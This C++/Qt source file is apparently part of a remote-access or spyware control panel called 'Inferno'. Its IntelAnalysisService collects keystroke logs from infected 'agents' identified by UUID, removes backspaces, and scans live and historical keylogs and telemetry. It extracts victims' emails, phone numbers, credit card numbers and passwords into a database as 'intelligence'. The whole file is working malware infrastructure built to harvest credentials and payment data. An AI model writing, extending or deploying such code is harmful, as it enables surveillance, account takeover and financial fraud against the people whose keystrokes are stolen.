#include "../../include/services/IntelAnalysisService.hpp"
#include "../../include/services/Analysis.hpp"
#include "../../include/database/Inferno_Database.hpp"
#include <QDateTime>
#include <QDebug>

namespace inferno {

IntelAnalysisService& IntelAnalysisService::instance() {
    static IntelAnalysisService inst;
    return inst;
}

void IntelAnalysisService::processKeylog(const QString& uuid, const QString& data) {
    if (data.trimmed().isEmpty()) return;

    // Update in-memory raw buffer (fetch from DB once if not cached yet)
    if (!m_agentRawKeylogs.contains(uuid)) {
        m_agentRawKeylogs[uuid] = Inferno_Database::instance().getRawKeylogsChronological(uuid);
    } else {
        m_agentRawKeylogs[uuid] += data;
    }

    // Filter backspaces from the running buffer
    std::string cleanKeylog = Analysis::filterBackspaces(m_agentRawKeylogs[uuid].toStdString());

    // Optimize regex passes: only scan the tail of the keylog stream for real-time updates
    std::string scanText = cleanKeylog;
    if (scanText.length() > 2048) {
        scanText = scanText.substr(scanText.length() - 2048);
    }

    // Circle 6 analysis pipeline on the sliding window scanText
    runAnalysisPipeline(uuid, scanText, "Keylog Stream");
    
    // Always trigger update notification to keep UI in sync
    emit intelligenceUpdated(uuid);
}

void IntelAnalysisService::processTelemetry(const QString& uuid, const QString& text, const QString& contextLabel) {
    int findings = runAnalysisPipeline(uuid, text.toStdString(), contextLabel);
    if (findings > 0) {
        emit intelligenceUpdated(uuid);
    }
}

int IntelAnalysisService::runHistoricalScan(const QString& uuid) {
    int new_findings = 0;

    // 1. Get full reconstructed keylog session (chronological order)
    QString fullKeylog = Inferno_Database::instance().getRawKeylogsChronological(uuid);
    std::string cleanKeylog = Analysis::filterBackspaces(fullKeylog.toStdString());

    // Scan keylogs chronologically
    new_findings += runAnalysisPipeline(uuid, cleanKeylog, "Historical Keylog");

    // 2. Scan historical telemetry logs
    QStringList telemetry = Inferno_Database::instance().getTelemetryHistory(uuid, "ALL", 5000);
    for (const QString& line : telemetry) {
        QString cleanLine = line;
        // Strip timestamp prefix like "[13:17:31] ..."
        if (line.startsWith("[") && line.indexOf("]") > 0) {
            cleanLine = line.mid(line.indexOf("]") + 1).trimmed();
        }
        new_findings += runAnalysisPipeline(uuid, cleanLine.toStdString(), "Historical Telemetry");
    }

    if (new_findings > 0) {
        emit intelligenceUpdated(uuid);
    }

    return new_findings;
}

int IntelAnalysisService::runAnalysisPipeline(const QString& uuid, const std::string& text, const QString& contextLabel) {
    int findings = 0;
    for (const auto& email : Analysis::extractEmails(text)) {
        if (Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), contextLabel)) {
            findings++;
        }
    }
    for (const auto& phone : Analysis::extractPhones(text)) {
        if (Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), contextLabel)) {
            findings++;
        }
    }
    for (const auto& card : Analysis::extractCreditCards(text)) {
        if (Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), contextLabel)) {
            findings++;
        }
    }
    for (const auto& pair : Analysis::extractPasswords(text)) {
        if (Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second))) {
            findings++;
        }
    }
    return findings;
}

} // namespace inferno
